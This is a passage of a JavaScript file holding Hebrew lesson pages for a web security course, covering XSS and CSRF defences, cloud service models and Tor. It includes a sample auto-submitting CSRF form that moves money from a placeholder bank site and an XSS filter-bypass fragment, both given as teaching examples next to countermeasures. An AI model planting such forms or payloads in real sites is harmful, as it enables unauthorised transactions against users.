          התו <code>&lt;</code> מומר ל־<code>&amp;lt;</code>, התו <code>&gt;</code> ל־<code>&amp;gt;</code>, <code>&amp;</code> ל־<code>&amp;amp;</code>, <code>"</code> ל־<code>&amp;quot;</code>, ו־<code>'</code> ל־<code>&amp;#x27;</code>.
          כך הדפדפן מציג למשתמש את התווים על המסך, אך מבין שמדובר בטקסט רגיל ולא בתגית להרצה!
        </li>
        <li><strong>אימות קלט מבוסס רשימה לבנה (Input Validation — Whitelist):</strong>
          קבלת קלטים התואמים אך ורק תבנית מותרת מוגדרת מראש (למשל תווים אלפאנומריים בלבד). רשימה שחורה (Blacklist — "למחוק את המילה script") נכשלת מול עקיפות חלופיות כמו <code>&lt;img src=x onerror=...&gt;</code>.
        </li>
        <li><strong>מדיניות אבטחת תוכן (Content Security Policy — CSP):</strong>
          כותרת HTTP (כגון <code>Content-Security-Policy: default-src 'self'</code>) שבה השרת מורה לדפדפן מאילו מקורות מותר לו לטעון ולהריץ סקריפטים. כותרת זו חוסמת הרצת סקריפטים בגוף הדף (Inline scripts) ואוסרת שימוש ב־<code>eval</code>.
        </li>
        <li><strong>דגל <code>HttpOnly</code> לעוגיות:</strong>
          הגדרת הדגל מונעת מ־JavaScript לקרוא את העוגיה דרך <code>document.cookie</code>. גם אם מתרחש XSS, התוקף אינו יכול לגנוב את עוגיית המושב.
        </li>
      </ol>

      <h3>3. מתקפת זיוף בקשות חוצה־אתרים (CSRF — Cross-Site Request Forgery)</h3>
      <p>במתקפת <strong>CSRF</strong> התוקף אינו מנסה לגנוב את עוגיית המושב שלכם, ואינו צריך להריץ קוד באתר המותקף. במקום זאת, הוא מנצל את העובדה שהדפדפן שלכם <em>מצרף באופן אוטומטי את עוגיות האימות שלכם לכל בקשה המופנית אל אתר היעד!</em></p>
      
      <p><strong>תרחיש התקיפה צעד־אחר־צעד:</strong></p>
      <ol>
        <li><strong>התחברות:</strong> המשתמש התחבר לאתר הבנק שלו (<code>bank.example.com</code>) בלשונית אחת, ומחזיק כעת בעוגיית מושב תקפה בדפדפן.</li>
        <li><strong>גלישה לאתר עוין:</strong> בלשונית שנייה, המשתמש גולש לאתר זדוני (<code>evil.org</code>).</li>
        <li><strong>הפעלת הבקשה המזויפת:</strong> האתר הזדוני מכיל טופס מוסתר הנשלח אוטומטית ברגע שהדף נטען:
          <pre class="code"><code>&lt;!-- דף זדוני באתר evil.org המנצל שליחה אוטומטית של טפסים --&gt;
&lt;form id="stealForm" action="https://bank.example.com/api/transfer" method="POST"&gt;
  &lt;input type="hidden" name="recipient" value="attacker_account" /&gt;
  &lt;input type="hidden" name="amount" value="5000" /&gt;
&lt;/form&gt;
&lt;script&gt;
  // שליחה מיידית ואוטומטית של הטופס ללא ידיעת המשתמש!
  document.getElementById("stealForm").submit();
&lt;/script&gt;</code></pre>
        </li>
        <li><strong>צירוף העוגיה האוטומטי:</strong> הדפדפן רואה בקשה המיועדת אל <code>bank.example.com</code>, וכברירת מחדל מצרף אליה אוטומטית את עוגיית המושב של המשתמש!</li>
        <li><strong>ביצוע הפעולה:</strong> שרת הבנק מקבל בקשה המלווה בעוגיית מושב חוקית לחלוטין. השרת אינו יכול לדעת שהמשתמש לא יזם אותה מרצונו, ומבצע את ההעברה הכספית!</li>
      </ol>

      <div class="panel">
        <p><strong>ההבחנה המרכזית בין XSS לבין CSRF (שאלת מבחן שכיחה):</strong></p>
        <ul>
          <li><strong>ב־XSS (הזרקת קוד):</strong> התוקף מריץ קוד בתוך ה־Origin של האתר שלכם. הוא <strong>עוקף את ה־SOP</strong> ויכול לקרוא סודות, לגנוב עוגיות ולשנות את תצוגת הדף.</li>
          <li><strong>ב־CSRF (זיוף בקשה):</strong> התוקף גורם לדפדפן לשלוח בקשה עיוורת. בשל מגבלות ה־SOP, התוקף <strong>אינו יכול לקרוא את תוכן התשובה</strong> מהשרת (אינו רואה את יתרת החשבון) — אך הפעולה משנת־המצב בצד השרת <strong>מתבצעת בהצלחה</strong> כי השרת סמך על העוגיה שנשלחה אוטומטית!</li>
        </ul>
      </div>

      <h3>4. אמצעי הגנה מפני CSRF (לפי דרישות הקורס)</h3>
      <ol>
        <li><strong>אסימוני הגנה (Anti-CSRF Synchronizer Tokens):</strong>
          מנגנון ההגנה הראשי והנפוץ ביותר.
          <br><strong>כיצד זה פועל?</strong>
          כאשר שרת הבנק מייצר למשתמש טופס משנה־מצב (כגון טופס העברה), השרת מייצר מחרוזת אקראית, סודית ובלתי ניתנת לניבוי ("אסימון" / Token). השרת שומר את האסימון במושב המשתמש (Session), ובמקביל משתיל אותו כשדה חבוי בתוך הטופס:
          <pre class="code"><code>&lt;!-- טופס מאובטח באתר הבנק עם אסימון סודי --&gt;
&lt;form action="https://bank.example.com/api/transfer" method="POST"&gt;
  &lt;input type="hidden" name="csrf_token" value="8f3a9e2c4b1d6f5a7098e" /&gt;
  &lt;input type="text" name="recipient" /&gt;
  &lt;input type="number" name="amount" /&gt;
  &lt;button type="submit"&gt;בצע העברה&lt;/button&gt;
&lt;/form&gt;</code></pre>
          כאשר המשתמש שולח את הטופס, האסימון נשלח יחד עם הנתונים. השרת מוודא שהאסימון שהתקבל תואם במדויק לאסימון השמור במושב.
          <br><strong>מדוע התוקף נכשל?</strong>
          מפני שאתר התוקף (<code>evil.org</code>) כפוף למדיניות ה־SOP! הוא אינו רשאי לקרוא את תוכן הטופס של <code>bank.example.com</code>, ולכן אינו יכול לדעת מהו האסימון הסודי ולא יכול לצרף אותו לבקשה המזויפת. בקשה ללא אסימון תקין נדחית מיד!
        </li>
        <li><strong>דגל עוגיה <code>SameSite</code>:</strong>
          הגדרת עוגיית המושב כ־<code>SameSite=Strict</code> או <code>SameSite=Lax</code> מונעת מהדפדפן לצרף את העוגיה לבקשות שמקורן באתר צד־שלישי. זוהי הגנה מובנית ברמת הדפדפן שאינה דורשת שינויים בטפסים.
        </li>
        <li><strong>בדיקת כותרות מקור (<code>Origin</code> ו־<code>Referer</code>):</strong>
          השרת בודק את כותרות הבקשה המציינות מאיזה דומיין נשלחה הפנייה, וחוסם בקשות שמקורן בדומיין זר. זוהי שכבת הגנה משלימה (הגנה לעומק / Defense-in-Depth).
        </li>
        <li><strong>אימות מחדש (Re-authentication):</strong>
          דרישת הזנת סיסמה מחדש או קוד אימות חד־פעמי (OTP) לפני ביצוע פעולות רגישות במיוחד.
        </li>
      </ol>
    `,
  },
  {
    id: "u6-saas",
    title: "מודלי ענן: IaaS,‏ PaaS,‏ SaaS,‏ FaaS (Serverless),‏ Web 2.0 ואחריות משותפת",
    html: `
      <p>מודל מחשוב הענן מסווג לארבע רמות שירות עיקריות, המגדירות "מי מנהל מה" ואת גבולות האחריות בין ספק הענן לבין הלקוח:</p>
      <ul>
        <li><strong>תשתית כשירות (IaaS — Infrastructure as a Service):</strong>
          <br>הספק מספק חומרה פיזית, תקשורת, אחסון גולמי ושכבת וירטואליזציה (Hypervisor).
          <br><strong>באחריות הלקוח:</strong> התקנת מערכת ההפעלה של המכונה הווירטואלית (Guest OS), עדכוני אבטחה וטלאים לליבה (Kernel Patches), הגדרת חומת אש, סביבות ריצה, מסדי נתונים וקוד היישום.
          <br><em>דוגמאות:</em> AWS EC2, Google Compute Engine, Azure VMs.
        </li>
        <li><strong>פלטפורמה כשירות (PaaS — Platform as a Service):</strong>
          <br>הספק מנהל את החומרה, מערכת ההפעלה, עדכוני האבטחה, התזמור וסביבת זמן־הריצה (Runtime).
          <br><strong>באחריות הלקוח:</strong> כתיבת קוד היישום, ניהול הנתונים והגדרת הרשאות משתמשים.
          <br><em>דוגמאות:</em> Heroku, Google App Engine, AWS Elastic Beanstalk.
        </li>
        <li><strong>פונקציה כשירות (FaaS — Function as a Service / Serverless):</strong>
          <br>מחשוב נטול שרתים (Serverless) מונע־אירועים (Event-driven). הספק מנהל לחלוטין את כל התשתית: מקצה תהליכים או קונטיינרים לפי דרישה, מספק <strong>סקלביליות (Scalability — התרחבות אוטומטית לפי עומס)</strong> מאפס ועד אלפי עותקים במקביל, וגובה תשלום אך ורק לפי מילי־שניות של זמן ביצוע נטו.
          <br><strong>באחריות הלקוח:</strong> כתיבת פונקציות קצרות (Handlers) המופעלות בתגובה לאירועים מוגדרים (כגון בקשת HTTP, קובץ שהועלה לאחסון, או הודעה שנכנסה לתור).
          <br><strong>היבטי אבטחה ב־FaaS:</strong> הקוד הוא ארעי וחסר מצב (Ephemeral / Stateless), מה שמקשה על התבצרות נוזקות; אולם משטח התקיפה כולל הזרקת נתונים דרך אירועים (Event Injection), ניהול סודות ומפתחות במשתני סביבה, וחובה קריטית בהגדרת הרשאות מינימום (Least Privilege) ברמת <strong>ניהול זהויות והרשאות (IAM — Identity and Access Management)</strong> לכל פונקציה בנפרד.
          <br><em>דוגמאות:</em> AWS Lambda, Google Cloud Functions, Azure Functions.
        </li>
        <li><strong>תוכנה כשירות (SaaS — Software as a Service):</strong>
          <br>יישום שלם ומוכן לשימוש קצה דרך הרשת והדפדפן. הספק מנהל את כל השכבות מקצה לקצה — תשתית, מערכת הפעלה, קוד, מסד נתונים וגיבויים.
          <br><strong>באחריות הלקוח:</strong> ניהול משתמשים והרשאות גישה פנים־ארגוניות, ואבטחת המידע המוזן לשירות.
          <br><em>דוגמאות:</em> Microsoft 365, Google Workspace, Salesforce.
        </li>
      </ul>
      <p><strong>מודל האחריות המשותפת (Shared Responsibility Model):</strong> ככל שעולים ממודל IaaS ל־SaaS, הספק נוטל אחריות על שכבות תשתית רבות יותר. עם זאת, הלקוח <em>לעולם אינו פטור מאחריות</em> על המידע שלו, על ניהול הזהויות וההרשאות, ועל שלמות הלוגיקה העסקית. באג בהרשאות (משתמש א' רואה מידע של משתמש ב'), חולשת XSS, הזרקת SQL או אימות לקוי — נשארים באחריות המפתח והארגון בכל מודל ענן.</p>
      <div class="panel">
        <p><strong>אנלוגיית הדיור — מי מנהל מה:</strong></p>
        <ul>
          <li><strong>IaaS</strong> — השכרת שלד בניין ריק: הספק דואג ליסודות, אתם בונים קירות, דלתות, מנעולים וצנרת (מערכת הפעלה ועדכונים).</li>
          <li><strong>PaaS</strong> — השכרת דירה מרוהטת: הספק דואג לתחזוקת הדירה ומכשירי החשמל; אתם מביאים רק את הבגדים והחפצים (הקוד).</li>
          <li><strong>FaaS</strong> — השכרת עמדת עבודה לפי שעה: מגיעים לעשות משימה מוגדרת ועוזבים מיד; המקום מתנקה ומתאפס אוטומטית.</li>
          <li><strong>SaaS</strong> — שהות בחדר מלון: מקבלים שירות מושלם. אבל אם השארתם את הדלת פתוחה או נתתם את המפתח לזר (הרשאות שגויות) — הפריצה היא באחריותכם.</li>
        </ul>
      </div>
      <p><strong>Web 2.0:</strong> המעבר ממרשתת סטטית שבה משתמשים רק צורכים תוכן, לרשת שיתופית של יצירה, הפצה ותוכן גולשים (User-Generated Content). דפנסיבית: כל פיסת תוכן ממשתמש היא קלט לא אמין שעלול להכיל הזרקות קוד (XSS), סקריפטים ופגיעות בנתונים, המחייבות קידוד קפדני ואימות בגבול האמון.</p>
    `,
  },
  {
    id: "u6-deep",
    title: "רשת עמוקה (Deep web) ונתב בצל (Tor)",
    html: `
      <p><strong>הרשת העמוקה (Deep web):</strong> כל חלקי רשת האינטרנט שמנועי חיפוש אינם יכולים להכניס לאינדקס (Indexing). הדימוי המקובל הוא רשת דייגים על פני האוקיינוס: מה שנלכד ברשת החיפוש הוא רק פני השטח (Surface Web). דפי אינטרנט הדורשים התחברות בסיסמה (כגון חשבון בנק או תיבת דואר אלקטרוני), מסדי נתונים פנימיים, ותוכן הנוצר דינמית במענה לטפסים — כולם מהווים חלק מהרשת העמוקה. בניגוד לטעות הנפוצה, מונח זה אינו מתייחס לפעילות פלילית או אסורה, אלא למידע שאינו נגיש לסריקה חופשית.</p>
      
      <p><strong>ההבחנה המדויקת:</strong></p>
      <ul>
        <li><strong>הרשת הגלויה (Surface Web):</strong> אתרים ציבוריים שאינדקס מנוע החיפוש סורק באופן חופשי (חדשות, בלוגים, ויקיפדיה).</li>
        <li><strong>הרשת העמוקה (Deep Web):</strong> כל תוכן שאינו מאונדקס (דואר פרטי, מאגרים אקדמיים סגורים, רשתות פנים־ארגוניות).</li>
        <li><strong>הרשת האפלה (Dark Web):</strong> תת־קבוצה קטנה בתוך הרשת העמוקה, הדורשת תוכנה ייעודית (כגון דפדפן Tor) לצורך גישה ומבוססת על פרוטוקולים להסתרת זהות.</li>
      </ul>

      <p><strong>נתב הבצל (Tor — The Onion Router):</strong> רשת תקשורת מבוזרת שנועדה לאפשר גלישה אנונימית ולהסתיר מי מדבר עם מי. המנגנון מבוסס על ניתוב התעבורה דרך שלושה ממסרים (Nodes / Relays) אקראיים:</p>
      <ol>
        <li><strong>צומת כניסה / שומר (Entry / Guard Node):</strong> יודע מי אתם (רואה את כתובת ה־IP שלכם), אך אינו יודע לאיזה יעד אתם גולשים.</li>
        <li><strong>צומת אמצע (Middle Node):</strong> יודע רק מי הצומת שהעביר לו את המידע ומי הצומת הבא בתור; אינו יודע מי הלקוח המקורי ומהו היעד.</li>
        <li><strong>צומת יציאה (Exit Node):</strong> יודע מהו היעד הסופי (אתר היעד), אך אינו יודע מי שלח את הבקשה.</li>
      </ol>

      <p>חבילת המידע מוצפנת בשלוש שכבות הצפנה אסימטרית (כמו גלדי בצל). כל צומת במסלול מקלף שכבת הצפנה אחת בלבד ומעביר הלאה. אף צומת בודד אינו מחזיק בשני הקצוות של החיבור בו־זמנית!</p>

      <div class="panel">
        <p><strong>מדוע פרוטוקול HTTPS עדיין קריטי בעת שימוש ב־Tor? (מוקש בחינה מובהק):</strong><br>
        צומת היציאה (Exit Node) מקלף את שכבת ההצפנה האחרונה של Tor ושולח את הבקשה אל אתר היעד ברשת הרגילה. אם הגלישה מתבצעת בפרוטוקול HTTP רגיל (ללא TLS), צומת היציאה או מאזין ברשת של אתר היעד <strong>רואה את תוכן התקשורת בטקסט גלוי לחלוטין!</strong> מפעיל צומת יציאה זדוני יכול לקרוא סיסמאות, לצותת לעוגיות מושב ולהזריק תוכן. לכן Tor אינו תחליף ל־HTTPS, אלא מנגנון משלים להסתרת מסלול בלבד.</p>
      </div>

      <p>בנוסף, אנונימיות במסלול אינה מגנה מפני מתקפות ברמת היישום: היא אינה מתקנת חולשות XSS או CSRF באתר היעד, אינה מגיעה להגנה מפני קובץ זדוני שהורד למחשב, ואינה מונעת מאתר היעד לזהות אתכם אם הקלדתם בו את שם המשתמש והסיסמה שלכם!</p>
    `,
  }
);
